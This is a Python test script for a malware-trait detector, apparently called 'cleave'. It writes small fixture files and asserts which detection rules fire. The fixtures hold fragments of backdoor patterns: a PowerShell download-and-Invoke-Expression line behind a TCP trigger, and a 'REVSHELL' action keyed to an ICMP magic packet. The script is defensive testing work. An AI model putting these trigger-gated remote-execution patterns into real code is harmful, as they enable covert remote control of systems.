#!/usr/bin/env python3
"""Check activation gates and generic decorator evidence."""
import argparse
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
assert not (repo / 'objectives/command-and-control/trigger').exists()
parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--cleave', default='../cleave/target/release/cleave')
args = parser.parse_args()
decorator = '''import threading
def ensure_env(fn):
    def wrapper():
        return fn()
    return wrapper
@ensure_env
def main():
    return 1
threading.Thread(target=main)
'''
tcp_gate = '''function Invoke-CallbackIEX { }
(New-Object Net.WebClient).DownloadString("http://example.org")
Invoke-Expression $command
$Client.AcceptTcpClient()
$line = $Reader.ReadLine()
if ($line -eq $Trigger) {}
$peer = ($Client.Client.RemoteEndPoint).Address.ToString()
'''
with tempfile.TemporaryDirectory(prefix='activation-evidence-') as tmp:
    root = Path(tmp)
    cases = {'icmp_signal.py': 'marker = "icmp_rcv"; magic = "1337 key"; action = "REVSHELL"\n',
             'icmp_normal.py': 'marker = "icmp_rcv"; magic = "1337 key"; action = "ICMP_ECHO"\n',
             'delivery.lua': 'if vs_count > 2 then if evaluate_trigger(disc) then deliver(body) end end\nlocal x = has_ssl and ssl_certs\n',
             'delivery_no_gate.lua': 'if vs_count > 2 then deliver(body) end\nlocal x = has_ssl and ssl_certs\n',
             'route.cs': 'class A { string route = "/trigger/execute"; }\n',
             'decorator.py': decorator,
             'thread_only.py': 'import threading\nthreading.Thread(target=work)\n',
             'gate.ps1': tcp_gate,
             'no_gate.ps1': tcp_gate.replace('if ($line -eq $Trigger) {}', '')}
    for name, text in cases.items():
        (root / name).write_text(text)
    result = subprocess.run(
        [str((repo / args.cleave).resolve()), '--traits-dir', str(repo), '--min-crit', 'component',
         '--format=json', *(str(root / name) for name in cases)],
        check=True, capture_output=True, text=True,
    )
    reports = [json.loads(line)['files'][0] for line in result.stdout.splitlines() if line]
    ids = {Path(r['path']).name: {t['id'] for t in r.get('traits', [])} for r in reports}
    icmp = 'objectives/execution/trigger/packet::icmp-magic-packet'
    lua = 'micro-behaviors/data/control-flow/branch::lua-service-conditional-delivery-clues'
    route = 'micro-behaviors/communications/http/url/api-path/route::trigger-execute-path-text'
    assert icmp in ids['icmp_signal.py'], ids['icmp_signal.py']
    assert icmp not in ids['icmp_normal.py']
    assert lua in ids['delivery.lua'], ids['delivery.lua']
    assert lua not in ids['delivery_no_gate.lua']
    assert route in ids['route.cs'], ids['route.cs']
    decorator_clues = 'micro-behaviors/os/env/test::env-decorator-thread-clues'
    trigger = 'objectives/execution/trigger/network::powershell-tcp-trigger-command-callback'
    assert decorator_clues in ids['decorator.py'], ids['decorator.py']
    assert decorator_clues not in ids['thread_only.py']
    assert trigger in ids['gate.ps1'], ids['gate.ps1']
    assert trigger not in ids['no_gate.ps1']
    print('Decorator clues remain neutral; TCP command activation requires its gate.')
